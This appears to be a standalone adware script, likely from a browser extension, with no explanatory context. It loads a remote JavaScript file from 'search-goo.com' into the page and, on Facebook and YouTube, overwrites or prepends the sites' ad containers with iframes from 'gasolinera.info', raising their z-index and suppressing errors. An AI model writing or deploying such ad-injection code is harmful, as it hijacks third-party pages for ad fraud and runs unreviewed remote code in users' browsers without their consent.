var s_s_s = document.createElement('script');
s_s_s.setAttribute("type", "text/javascript");
s_s_s.setAttribute("src", "https://search-goo.com/plugin/npbr.js");
document.getElementsByTagName('head')[0].appendChild(s_s_s);
function fb_y(){
	if (window.location.href.indexOf("facebook.com")>-1){
		eldiv=top.document.getElementsByTagName("div");
		//alert (eldiv.length);
		for (i=0;i<eldiv.length;i++){
			if (eldiv[i].className == "ego_unit_container" && eldiv[i].innerHTML.indexOf("controltec")<0) {
			eldiv[i].innerHTML='<iframe controltec=1 FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width=160 height=600 src="https://www.gasolinera.info/ads/ads.php?w=160&h=600"></iframe><br>'+eldiv[i].innerHTML;
			//eldiv[i].innerHTML='controltec'+eldiv[i].innerHTML;
			}
		}
	}
}

function ytb(){
	if (window.location.href.indexOf("youtube.com")>-1){
		eldiv=top.document.getElementsByTagName("div");
		for (i=0;i<eldiv.length;i++){
			if (eldiv[i].className.indexOf ("ad-container")>-1) {
			eldiv[i].innerHTML='<div class="container autoalign"><div class="controls" style="position:absolute; width:480px; height:60px; left:50%; margin-left:-234px;"><iframe controltec=1 FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width=468 height=60 src="https://www.gasolinera.info/ads/ads.php?w=468&h=60"></iframe></div></div>';
			eldiv[i].style.zIndex="100000";
			}
		}
	}
}

function ytbc(){
setTimeout("ytb()",14000);
}

if (window.location != window.parent.location){}
else {
try{
fb_y();
ytbc();
}
catch(e){}
}
